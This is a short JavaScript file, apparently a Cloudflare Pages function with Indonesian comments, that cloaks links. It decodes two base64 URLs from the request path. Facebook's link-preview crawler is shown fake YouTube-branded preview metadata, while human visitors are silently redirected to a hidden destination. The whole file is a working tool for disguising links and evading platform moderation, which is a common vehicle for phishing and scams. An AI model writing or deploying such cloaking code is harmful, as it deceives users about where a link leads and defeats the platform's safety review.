export async function onRequest(context) {
  const { request, params } = context;
  const url = new URL(request.url);
  const ua = request.headers.get("user-agent") || "";
  
  // Mengambil path di belakang domain (misal: /aHR0cHM6...)
  const fullPath = params.path ? params.path.join('/') : "";

  if (!fullPath || fullPath === "index.html") {
    return context.next();
  }

  try {
    // Decode data dari path (Format: Base64YouTube.Base64Tujuan)
    const [sEnc, uEnc] = fullPath.split('.');
    if (!sEnc || !uEnc) return context.next();

    const sourceUrl = atob(sEnc);
    const targetUrl = atob(uEnc);

    // LOGIKA PREVIEW UNTUK BOT FACEBOOK
    if (ua.includes("facebookexternalhit") || ua.includes("Facebot")) {
      const response = await fetch(sourceUrl, {
        headers: { "User-Agent": "facebookexternalhit/1.1" }
      });
      const htmlText = await response.text();

      const getMeta = (prop) => {
        const reg = new RegExp(`<meta[^>]*?(?:property|name)=["'](?:og:)?${prop}["'][^>]*?content=["']([^"']*)["']`, "i");
        const match = htmlText.match(reg);
        return match ? match[1] : "";
      };

      const title = getMeta("title") || "YouTube";
      const desc = getMeta("description") || "";
      
      let videoId = sourceUrl.includes("v=") ? sourceUrl.split("v=")[1].split("&")[0] : sourceUrl.split("/").pop().split("?")[0];
      const image = `https://i.ytimg.com/vi/${videoId}/maxresdefault.jpg`;

      return new Response(`<!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <meta property="og:site_name" content="YouTube">
        <meta property="og:title" content="${title}">
        <meta property="og:description" content="${desc}">
        <meta property="og:image" content="${image}">
        <meta property="og:image:width" content="1280">
        <meta property="og:image:height" content="720">
        <meta property="og:type" content="video.other">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:image" content="${image}">
      </head>
      <body></body>
      </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
    }

    // JIKA MANUSIA: Redirect Langsung
    return Response.redirect(targetUrl, 302);

  } catch (e) {
    return context.next();
  }
}
